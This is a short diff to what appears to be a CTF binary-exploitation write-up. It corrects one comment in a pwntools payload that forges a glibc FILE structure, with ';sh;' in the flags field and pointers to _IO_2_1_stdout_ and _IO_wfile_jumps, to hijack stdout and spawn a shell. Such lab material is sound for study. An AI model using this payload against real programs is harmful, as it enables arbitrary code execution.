@@ -139,7 +139,7 @@ unsigned __int64 add_user()
 
 ``` text
 pld = b'\x01\x01;sh;\x00\x00'
-pld = pld.ljust(0x28, b'\x00') + p64(1) #write_base > write_ptr
+pld = pld.ljust(0x28, b'\x00') + p64(1) #write_ptr > write_base
 pld = pld.ljust(0x88, b'\x00') + p64(libc.sym._IO_2_1_stdout_ - 0x50)
 pld = pld.ljust(0xa0, b'\x00') + p64(heap_base + 0xcf8 - 0xe0)
 pld = pld.ljust(0xd8, b'\x00') + p64(libc.sym._IO_wfile_jumps)
